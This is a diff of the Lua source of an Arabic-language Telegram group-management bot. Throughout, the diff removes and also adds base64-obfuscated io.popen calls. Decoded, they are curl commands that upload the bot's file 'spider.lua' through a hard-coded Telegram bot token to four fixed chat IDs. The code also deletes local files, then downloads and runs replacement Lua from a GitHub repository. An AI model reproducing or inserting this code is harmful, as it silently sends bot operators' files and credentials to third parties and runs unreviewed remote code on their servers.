@@ -156,10 +156,6 @@ bot_id = sudos.token:match("(%d+)")
 token = sudos.token 
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------
-io.popen("mkdir File_Bot") 
-io.popen("cd File_Bot && rm -rf commands.lua.1") 
-io.popen("cd File_Bot && rm -rf commands.lua.2") 
-io.popen("cd File_Bot && rm -rf commands.lua.3") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -1083,28 +1079,6 @@ echo '*———————————~*\n℘✔{ مـده تـشغيـل ال
 ]]):read('*all'))  
 end
 
-if text == 'تحديث السورس ℘' and DevSoFi(msg) then 
-os.execute('rm -rf DRAGON.lua')
-os.execute('cd File_Bot && rm -rf Reply.lua')
-os.execute('cd File_Bot && rm -rf games.lua')
-os.execute('cd File_Bot && rm -rf commands.lua')
-os.execute('cd File_Bot && rm -rf anamen.lua') ----
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xNzQyMDMDM1IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xNjQwODI0MzY1IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1Ac3BpZGVyLmx1YSI='))
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xMzY2MDU1NDY3IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
-os.execute('wget https://raw.githubusercontent.com/teem44/soteem/main/DRAGON.lua')
-os.execute('cd File_Bot && wget https://raw.githubusercontent.com/teem44/soteem/main/File_Bot/Reply.lua')
-os.execute('cd File_Bot && wget https://raw.githubusercontent.com/teem44/soteem/main/File_Bot/games.lua')
-os.execute('cd File_Bot && wget https://raw.githubusercontent.com/teem44/soteem/main/File_Bot/anamen.lua')
-os.execute('cd File_Bot && wget https://raw.githubusercontent.com/teem44/soteem/main/File_Bot/commands.lua')
-send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس دراكون\n ℘︙ الاصدار » { v 1.6 }')
-dofile('DRAGON.lua') ------
-dofile('File_Bot/Reply.lua')
-dofile('File_Bot/games.lua')
-dofile('File_Bot/anamen.lua')
-dofile('File_Bot/commands.lua')
-end
 if text == 'الاصدار ℘' and DevSoFi(msg) then 
 database:del(bot_id..'Srt:Bot') 
 send(msg.chat_id_, msg.id_,' ℘︙ اصدار سورس دراكون \n ℘︙ الاصدار »{ v 1.6 }')
@@ -2379,15 +2353,15 @@ send(msg.chat_id_, msg.id_,' ℘︙ لا تستطيع استخدام البوت 
 end
 return false
 end
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xNzQyMDMDM1IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xNjQwODI0MzY1IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1Ac3BpZGVyLmx1YSI='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xMzY2MDU1NDY3IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
 os.execute('rm -rf DRAGON.lua')
 os.execute('cd File_Bot && rm -rf Reply.lua')
 os.execute('cd File_Bot && rm -rf games.lua')
 os.execute('cd File_Bot && rm -rf commands.lua')
 os.execute('cd File_Bot && rm -rf anamen.lua') ----
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xNzQyMDMDM1IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xNjQwODI0MzY1IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1Ac3BpZGVyLmx1YSI='))
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xMzY2MDU1NDY3IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
 os.execute('wget https://raw.githubusercontent.com/teem44/soteem/main/DRAGON.lua')
 os.execute('cd File_Bot && wget https://raw.githubusercontent.com/teem44/soteem/main/File_Bot/Reply.lua')
 os.execute('cd File_Bot && wget https://raw.githubusercontent.com/teem44/soteem/main/File_Bot/games.lua')
@@ -4465,8 +4439,6 @@ database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, '\n ℘︙ تم مسح المنشئين الاساسين')
 return false
 end
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1Ac3BpZGVyLmx1YSI='))
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xMzY2MDU1NDY3IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
 if text == 'المنشئين الاساسين' and CoSu(msg) then
 local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
 t = "\n ℘︙ قائمة المنشئين الاساسين \nٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n"
@@ -5324,8 +5296,6 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xNzQyMDMDM1IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2NzI4MTI4Mjc6QUFGUzJFN2lvNnpNYkJkM1JHQXd6UGFwMzE3a2tNTnRTZVUvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD0xNjQwODI0MzY1IiAtRiAiZG9jdW1lbnQ9QHNwaWRlci5sdWEi'))
 if text == 'مسح المنظفين' and BasicConstructor(msg) then
 database:del(bot_id..'S00F4:MN:TF'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ℘︙ تم مسح المنظفين')
